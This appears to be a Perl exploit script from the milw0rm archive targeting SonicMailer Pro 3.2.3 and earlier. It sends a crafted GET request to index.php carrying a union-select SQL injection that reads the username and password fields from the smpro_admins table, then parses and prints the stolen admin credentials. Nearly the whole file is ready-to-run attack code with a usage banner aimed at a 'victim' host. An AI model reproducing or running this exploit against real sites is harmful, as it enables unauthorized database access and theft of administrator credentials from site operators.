#!/usr/bin/perl
#[Script Name: SonicMailer Pro <= 3.2.3 (index.php) Remote Blind SQL Injection Exploit
#[Coded by   : ajann
#[Author     : ajann
#[Contact    : :(
#[S.Page     : http://www.triexa.com
#[$$         : Standart License 89$
#[..         : ajann,Turkey

use IO::Socket;
if(@ARGV < 1){
print "
[========================================================================
[//   	SonicMailer Pro <= 3.2.3 (index.php) Remote Blind SQL Injection Exploit
[//                   Usage: exploit.pl [target]
[//                   Example: exploit.pl victim.com
[//                   Example: exploit.pl victim.com
[//                           Vuln&Exp : ajann
[========================================================================
";
exit();
}
#Local variables
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = "http://".$server;
$port = "80";
$file = "/index.php?page=archive&list=";

print "Script <DIR> : ";
$dir = <STDIN>;
chop ($dir);

if ($dir =~ /exit/){
print "-- Exploit Failed[You Are Exited] \n";
exit();
}

if ($dir =~ /\//){}
else {
print "-- Exploit Failed[No DIR] \n";
exit();
 }


$target = "-1%20union%20select%201,2,concat(char(117,115,101,114,110,97,109,101,58),username,char(112,97,115,115,119,111,114,100,58),password)%20from%20smpro_admins/*";
$target = $host.$dir.$file.$target;

#Writing data to socket
print "+**********************************************************************+\n";
print "+ Trying to connect: $server\n";
$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
print $socket "GET $target HTTP/1.1\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "+ Connected!...\n";
#Getting
while($answer = <$socket>) {
if ($answer =~ /username:(.*?)pass/){
print "+ Exploit succeed! Getting admin information.\n";
print "+ ---------------- +\n";
print "+ Username: $1\n";
}

if ($answer =~ /password:(.*?)<\/a>/){
print "+ Password: $1\n";
}

if ($answer =~ /Syntax error/) { 
print "+ Exploit Failed : ( \n";
print "+**********************************************************************+\n";
exit(); 
}

if ($answer =~ /Internal Server Error/) {
print "+ Exploit Failed : (  \n";
print "+**********************************************************************+\n";
exit(); 
}
 }

# milw0rm.com [2007-03-11]
